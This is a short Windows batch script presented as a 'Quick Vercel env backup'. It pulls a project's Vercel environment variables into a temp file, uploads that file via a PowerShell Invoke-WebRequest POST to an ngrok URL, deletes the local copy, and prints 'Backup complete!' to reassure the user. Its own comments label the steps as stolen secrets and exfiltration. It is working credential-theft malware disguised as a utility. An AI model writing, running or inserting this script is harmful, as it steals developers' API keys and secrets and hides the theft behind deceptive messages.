@echo off
echo "Quick Vercel env backup starting..."

REM Step 1: Trigger bug - Write .env to temp
vercel env pull C:\Temp\stolen-secrets.env --yes

REM Step 2: Exfil via PowerShell (to ngrok URL)
powershell -Command "$url = 'http://[NGROK_URL]/upload'; $file = 'C:\Temp\stolen-secrets.env'; if (Test-Path $file) { $content = Get-Content $file -Raw; Invoke-WebRequest -Uri $url -Method POST -Body @{file=(New-Object System.IO.MemoryStream -ArgumentList (,[byte[]][char[]]$content))} -ContentType 'multipart/form-data' -UseBasicParsing }"

REM Cleanup
if exist C:\Temp\stolen-secrets.env del C:\Temp\stolen-secrets.env

echo "Backup complete! Check your .env.local for safety."
